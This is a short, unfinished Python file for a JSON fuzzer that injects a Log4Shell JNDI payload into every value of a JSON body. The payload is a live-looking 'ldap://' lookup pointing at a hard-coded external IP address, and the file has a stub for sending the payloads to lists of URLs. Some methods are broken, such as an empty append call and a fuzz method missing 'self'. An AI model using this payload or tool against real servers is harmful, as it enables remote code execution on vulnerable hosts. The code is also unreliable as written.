import json
import grequests
import copy

class JsonFuzz:
    def __init__(self):
        self.json_loaded = False
        self.jndi_string = "${jndi:ldap://44.237.180.145:10389}"
        self.fuzzy_json = []
        self.urls = []

    def _check_if_loaded(self):
        if self.json_loaded == False:
            raise Exception("You don't have any JSON loaded, use load_json")


    def add_urls(self, urls):
        if not isinstance(urls, list):
            raise Exception("You must provide a list of URLs")

        for url in urls:
            self.urls.append()

    def _print_loaded(self):
        self._check_if_loaded()
        print(self.json_dic)
    
    def _print_fuzzed(self):
        print(self.fuzzy_json)

    def load_json(self, json_string):
        """Load JSON string, set class state to json loaded true"""
        self.json_loaded = True
        self.json_dic = json.loads(json_string)
        return self.json_dic

    def replace_value(self, _dic, key_to_fuzz_value, fuzzed_value = None):
        """replace a value in the json dictionary"""
        self._check_if_loaded()
        if not fuzzed_value:
            _dic[key_to_fuzz_value] = self.jndi_string
        else:
            _dic[key_to_fuzz_value] = fuzzed_value

        return _dic

    def replace_key(self):
        pass

    def create_fuzz_strings_values(self):
        self._check_if_loaded()
        json_fuzzed_strings_list = {}
        for k in self.json_dic:
            dic_copy = copy.deepcopy(self.json_dic)
            self.replace_value(dic_copy, k)
            self.fuzzy_json.append(dic_copy)

        return self.fuzzy_json

class FuzzRunner:
    def __init__(self):
        pass

    def fuzz(urls):
        rs = (grequests.get(u) for u in urls)


if __name__ == "__main__":

    def main():
        test_json = '{"key1" : "value1", "key2" : "value2"}'
        jf = JsonFuzz()
        jf.load_json(test_json)
        jf._print_loaded()
        jf.create_fuzz_strings_values()
        jf._print_fuzzed()


    fuzzed_values = main()